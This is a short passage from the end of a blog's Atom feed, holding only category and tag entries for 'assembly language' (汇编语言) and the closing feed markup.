      <category term="汇编语言" scheme="https://nocbtm.github.io/categories/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
    
      <category term="汇编语言" scheme="https://nocbtm.github.io/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
</feed>
